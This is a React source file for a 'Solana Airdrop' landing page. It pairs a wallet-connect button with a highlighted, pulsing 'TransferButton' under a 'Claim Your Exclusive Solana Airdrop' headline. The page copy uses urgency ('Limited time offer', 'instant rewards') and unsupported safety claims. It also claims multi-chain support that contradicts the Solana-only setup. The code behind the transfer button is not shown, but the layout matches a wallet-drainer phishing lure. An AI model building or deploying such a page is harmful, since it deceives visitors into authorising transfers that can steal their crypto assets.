// src/App.jsx
import { useMemo } from 'react';
import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import ConnectWallet from './components/ConnectWallet';
import TransferButton from './components/TransferButton';
import { WalletContext } from './contexts/WalletContext';
import './styles/airdrop.css';

// Optional: styling for wallet modal
import '@solana/wallet-adapter-react-ui/styles.css';

export default function App() {
  return (
    <WalletContext>
      <WalletModalProvider>
        <div className="app-container">
          {/* Header */}
          <header className="header">
            <nav className="nav container">
              <div className="logo">Solana Airdrop</div>
              <div id="walletContainer">
                <WalletMultiButton className="!bg-indigo-600 hover:!bg-indigo-700" />
              </div>
            </nav>
          </header>

          {/* Hero Section */}
          <section className="hero">
            <div className="container">
              <div className="hero-content">
                <div className="hero-text">
                  <h1>
                    Claim Your <span className="highlight">Exclusive</span><br />
                    Solana Airdrop
                  </h1>
                  <p>
                    Join the next generation of DeFi. Connect your wallet and claim exclusive Solana tokens. 
                    Limited time offer with instant rewards for early adopters.
                  </p>
                  <div className="space-y-4">
                    <ConnectWallet />
    <TransferButton className="
  bg-gradient-to-r from-indigo-600 to-purple-600
  hover:from-indigo-700 hover:to-purple-700
  text-white shadow-lg hover:shadow-xl
  transform hover:scale-105
  transition-all duration-300 ease-in-out
  transfer-btn pulse-glow
" />




                  </div>
                </div>
                <div className="hero-visual">
                  <div className="crypto-orb animate-float"></div>
                </div>
              </div>
            </div>
          </section>

          {/* Info Section */}
          <section className="info-section">
            <div className="container">
              <h2 className="section-title">
                Why Choose Our <span className="gradient-text">Airdrop</span>
              </h2>
              <p className="section-description">
                Experience the future of decentralized finance with our revolutionary token distribution system
              </p>
              
              <div className="info-grid">
                <div className="info-card">
                  <div className="info-card-icon">🚀</div>
                  <h3>Instant Claims</h3>
                  <p>Connect your wallet and claim tokens instantly. No waiting periods or complex verification processes.</p>
                </div>
                <div className="info-card">
                  <div className="info-card-icon">🔒</div>
                  <h3>Secure & Safe</h3>
                  <p>Built with industry-leading security standards. Your wallet and assets are always protected.</p>
                </div>
                <div className="info-card">
                  <div className="info-card-icon">🌍</div>
                  <h3>Multi-Chain Support</h3>
                  <p>Compatible with Ethereum, Polygon, and Arbitrum networks. Choose your preferred blockchain.</p>
                </div>
              </div>
            </div>
          </section>


          <p className="text-xs text-gray-500 mt-6 text-center">
            Supports Phantom, Solflare, and all Wallet Standard wallets.
          </p>
        </div>
      </WalletModalProvider>
    </WalletContext>
  );
}
